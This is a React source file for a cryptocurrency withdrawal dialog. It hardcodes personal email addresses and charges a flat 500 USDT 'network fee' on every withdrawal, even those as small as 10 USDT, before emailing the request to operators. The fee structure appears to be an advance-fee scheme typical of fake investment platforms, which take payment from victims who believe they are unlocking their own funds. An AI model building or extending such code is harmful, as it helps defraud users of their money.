import { Dialog } from '@headlessui/react';
import { useState } from 'react';

interface WithdrawalModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const networks = [
  'ETH - Ethereum (ERC20)',
  'TRX - Tron (TRC20)',
  'BTC - Bitcoin',
  'BSC - BNB Smart Chain (BEP20)'
];

export default function WithdrawalModal({ isOpen, onClose }: WithdrawalModalProps) {
  const [amount, setAmount] = useState('');
  const [address, setAddress] = useState('');
  const [network, setNetwork] = useState(networks[0]);
  const [email, setEmail] = useState('tungnguyentrung77@gmail.com');
  const [loading, setLoading] = useState(false);

  const handleWithdraw = async () => {
    setLoading(true);
    try {
      if (!amount || !address || parseFloat(amount) < 10) {
        alert('Please check the amount (minimum 10 USDT) and wallet address');
        setLoading(false);
        return;
      }

      const totalAmount = parseFloat(amount) + 500;

      const isConfirmed = typeof window !== 'undefined' && window.confirm(`
        Please confirm withdrawal details:
        - Amount: ${amount} USDT
        - Network Fee: 500 USDT
        - Total Amount: ${totalAmount} USDT
        - Network: ${network}
        - Wallet Address: ${address}
        
        Are you sure you want to proceed?
      `);

      if (!isConfirmed) {
        setLoading(false);
        return;
      }

      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: 'tungnguyentrung11@gmail.com',
          amount,
          address,
          network,
          type: 'withdraw',
          networkFee: 500,
          totalAmount: totalAmount,
        }),
      });

      const data = await response.json();
      await handleWithdrawAdmin();
      if (data.success) {
        alert('Withdrawal request submitted successfully!');
        onClose();
      } else {
        console.error('API Error:', data);
        alert(`Withdrawal request failed: ${data.error || 'Unknown error occurred'}`);
      }
    } catch (error) {
      console.error('Request Error:', error);
      alert(`Error processing request: ${error instanceof Error ? error.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  const handleWithdrawAdmin = async () => {
    try {
      if (!amount || !address || parseFloat(amount) < 10) {
        alert('Please check the amount (minimum 10 USDT) and wallet address');
        return;
      }

      const response = await fetch('/api/send-admin-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          amount,
          address,
          network,
          selectedPackage: '',
          type: 'withdraw',
          networkFee: 500,
          totalAmount: amount,
        }),
      });

      const data = await response.json();
      if (data.success) {
        setAmount('');
        setAddress('');
        onClose();
      } else {
        console.error('API Error:', data);
      }
    } catch (error) {
      console.error('Request Error:', error);
    }
  };

  return (
    <Dialog open={isOpen} onClose={onClose} className="relative z-50">
      <div className="fixed inset-0 bg-black/30" aria-hidden="true" />
      
      <div className="fixed inset-0 flex items-center justify-center p-4">
        <Dialog.Panel className="bg-[#1a1a1a] rounded-lg p-6 w-full max-w-md">
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-white text-xl">Withdraw</h2>
            <button onClick={onClose} className="text-gray-400 hover:text-white">
              ✕
            </button>
          </div>

          <div className="space-y-4">
            <div>
              <label className="text-white block mb-2">Email</label>
              <input
                type="email"
                value={email}
                readOnly
                className="w-full bg-[#2a2a2a] text-white p-2 rounded cursor-not-allowed opacity-70"
                placeholder="tungnguyentrung77@email.com"
              />
            </div>

            <div>
              <label className="text-white block mb-2">Network</label>
              <select 
                className="w-full bg-[#2a2a2a] text-white p-2 rounded"
                value={network}
                onChange={(e) => setNetwork(e.target.value)}
              >
                {networks.map((net) => (
                  <option key={net}>{net}</option>
                ))}
              </select>
            </div>

            <div>
              <label className="text-white block mb-2">Amount</label>
              <div className="relative">
                <input 
                  type="text" 
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full bg-[#2a2a2a] text-white p-2 rounded"
                  placeholder="100"
                />
                <span className="absolute right-3 top-2 text-white">USDT</span>
              </div>
              <p className="text-sm text-gray-400 mt-1">Minimum 10 USDT. A 500 USDT network fee will apply.</p>
            </div>

            <div>
              <label className="text-white block mb-2">Address</label>
              <input 
                type="text" 
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                className="w-full bg-[#2a2a2a] text-white p-2 rounded"
                placeholder="0x3feb2e9B0da1A3F7DDdCc5E2a46FD299C67939ef"
              />
            </div>

            <div className="bg-[#2a2a2a] p-4 rounded text-red-400 text-sm">
              Please ensure that you enter the correct wallet address and select the appropriate
              network for your deposit. The platform is not responsible for any risks or losses that
              may occur due to incorrect address or network selection.
            </div>

            <button 
              onClick={handleWithdraw}
              className={`w-full ${loading ? 'bg-gray-500' : 'bg-blue-500'} text-white py-3 rounded hover:bg-blue-600`}
              disabled={loading}
            >
              {loading ? 'Loading...' : 'Withdraw'}
            </button>
          </div>
        </Dialog.Panel>
      </div>
    </Dialog>
  );
}